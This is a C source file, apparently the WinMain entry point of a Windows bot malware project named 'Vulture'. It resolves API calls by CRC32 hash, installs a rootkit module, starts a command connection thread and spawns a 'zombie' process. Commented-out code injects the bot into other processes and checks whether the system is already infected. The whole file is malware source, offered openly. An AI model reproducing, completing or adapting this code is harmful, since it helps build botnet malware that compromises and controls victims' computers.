#include "bot_structs.h"
#include "api.h"
#include "mem.h"
#include "zombie.h"
#include "connection.h"
#include "install.h"
#include "os_info.h"
#include "inject.h"
#include "modules.h"
#include "string.h"

bot_t bot;

#ifdef MODULE_ROOTKIT
#include "rootkit.h"
#endif

BOOL WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nShowCmd)
{
	bot.crc.crc32Intalized = FALSE;

#ifdef DEBUG
	LPSTR pszShit = "NtCreateFile";

	DWORD dwHash = crc32Hash(pszShit, lstrlenA(pszShit));
	
	/*LPWSTR pwzShit = L"ws2_32.dll";
	DWORD dwHash = crc32Hash(pwzShit, lstrlenW(pwzShit) * 2);*/
#endif
	
	//g_Bot.crc.crc32Intalized = FALSE;
	
	
	if (!InitializeAPI())
	{
		return TRUE;
	}

	bot.hLocal = bot.api.pGetModuleHandleW(NULL);

 	bot.api.pGetModuleFileNameW(NULL, bot.wzBotPath, 255);

	/*UnhookProcess();*/
	/*
	if (!IsSystemInfected(&bot))
	{
		InstallVulture(&bot);

		return FALSE;
	}
	*/

#ifdef DEBUG
#ifdef MODULE_ROOTKIT
	InstallRootkit();
#endif
#endif

	//StartConnectionThread(&bot);
#if defined DEBUG
	StartConnectionThread();

	while (TRUE)
	{
		bot.api.pSleep(1000);
	}
#else

	CreateZombie();


#endif

	bot.api.pExitProcess(0);
// 	if (!CreateZombie(&bot))
// 	{
// 		MessageBox(0, 0, 0, 0);
// 	}

// 
// 	DWORD i = InjectBot((void*)VultureEntryPoint, (PBYTE)VultureEntryPointEnd - (PBYTE)VultureEntryPoint);
// 
// 	if (i > 0)
// 		MessageBox(0, "A process was infected!", 0, 0);
// 	else MessageBox(0, "No processes were infected!", 0, 0);
// 
// 	LPWSTR pwzExplorer = L"user32.dll";
// 	DWORD dwLength = StrLengthW(pwzExplorer) * 2;
// 
// 	DWORD dwHash = crc32Hash(pwzExplorer, dwLength);

	//CreateZombie();

// 	while (!CreateZombie())
// 		CWA(Sleep)(1000);

// 	if (!CreateZombie())
// 	{
		//MessageBox(0, "Zombie failed.", 0, 0);
/*	}*/
// 
// 	LPSTR pwzGetWindowsDirectoryW = "GetSystemDirectoryW";
// 	DWORD dwHash = crc32Hash(pwzGetWindowsDirectoryW, StrLengthA(pwzGetWindowsDirectoryW));
// 	
// 	BOOL bIs64 = IsOperatingSystem64Bit();


	//LPWSTR pwz = GetSystem32Dir(&g_Bot);

	
	return FALSE;
}